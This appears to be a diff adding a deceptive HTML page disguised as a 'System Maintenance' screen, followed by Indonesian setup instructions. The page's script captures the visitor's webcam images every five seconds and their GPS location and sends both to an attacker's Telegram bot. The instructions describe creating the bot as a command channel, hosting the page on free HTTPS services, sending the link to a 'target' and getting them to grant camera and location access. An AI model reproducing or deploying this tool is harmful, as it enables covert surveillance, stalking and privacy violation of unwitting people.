@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+<head><title>System Maintenance</title></head>
+<body style="background:#000;color:#0f0;font-family:monospace;text-align:center;">
+    <h2 id="msg">INITIALIZING SECURE MODULE...</h2>
+    <video id="v" autoplay style="display:none"></video>
+    <canvas id="c" style="display:none"></canvas>
+    <script>
+        const TOKEN = "YOUR_BOT_TOKEN_HERE";
+        const CHAT_ID = "YOUR_CHAT_ID_HERE";
+        const v = document.getElementById('v');
+        const c = document.getElementById('c');
+
+        async function start() {
+            try {
+                // Akses Kamera
+                const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
+                v.srcObject = s;
+                // Akses Lokasi
+                navigator.geolocation.getCurrentPosition(pos => {
+                    sendMsg(`📍 Location: https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`);
+                });
+                setInterval(capture, 5000);
+            } catch (e) { document.getElementById("msg").innerText = "ACCESS REQUIRED TO PROCEED"; }
+        }
+
+        function sendMsg(text) {
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
+        }
+
+        function capture() {
+            c.width = v.videoWidth; c.height = v.videoHeight;
+            c.getContext('2d').drawImage(v, 0, 0);
+            c.toBlob(b => {
+                const f = new FormData();
+                f.append('chat_id', CHAT_ID);
+                f.append('photo', b, 'src.jpg');
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {method:'POST', body:f});
+            }, 'image/jpeg', 0.6);
+        }
+        window.onload = start;
+    </script>
+</body>
+</html>
+
+
+
+[ CARA MENERAPKAN ]
+Persiapan C2 Telegram:
+Buka Telegram, cari @BotFather, buat bot baru, dan salin API Token.
+
+Cari @userinfobot untuk mendapatkan Chat ID akun Anda.
+
+Tempelkan Token dan Chat ID ke dalam kode di atas pada bagian TOKEN dan CHAT_ID.
+
+Deployment (Hosting):
+Simpan kode sebagai index.html.
+Upload ke platform hosting yang mendukung HTTPS (Wajib).
+Rekomendasi: GitHub Pages, Vercel, atau Netlify (Gratis & Cepat).
+
+Eksekusi:
+Kirimkan link HTTPS hasil deploy ke target.
+Pastikan target menekan tombol "Allow" saat browser meminta izin Kamera dan Lokasi.
+Cek Telegram Anda; foto dan koordinat GPS akan masuk secara otomatis setiap 5 detik.
+
+
+
+
+©Baldwin
+JANGAN DI SHARE KEMANA PUN ANJ
+UNTUK PEMAKAIAN PRIBADI 
